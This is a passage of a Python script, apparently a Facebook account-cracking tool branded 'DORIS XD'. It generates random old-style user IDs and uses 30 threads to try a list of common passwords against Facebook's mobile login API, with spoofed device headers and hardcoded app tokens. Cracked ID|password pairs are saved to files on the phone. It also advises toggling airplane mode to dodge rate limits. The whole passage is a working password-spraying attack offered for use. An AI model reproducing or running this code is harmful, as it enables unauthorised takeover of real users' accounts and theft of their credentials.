    prefix = '1000003'#ĐỔI SỐ 3 HOẶC 4  ĐỂ CRACK THÁNG 6,7,8,9 CỦA 2009
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mHAR 5 MINT ME AEROPLANE MODE LGAO{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDORIS-XD-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '123123', '654321', '111111', '666666', '000000000', 'iloveyou', '1234567', '12345678', '123456789', '0123456789', '0987654321'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mDORIS XD \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/download/DORIS -OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDORIS XD \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/download/DORIS -OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDORIS XD\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")

    for pw in ('123456', '123123', '654321', '111111', '222222', '666666', '000000000', 'iloveyou', '1234567', '12345678', '123456789', '0123456789', '0987654321'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mDORIS XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/download/DORIS -OLD-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDORIS XD \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/download/DORIS -OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()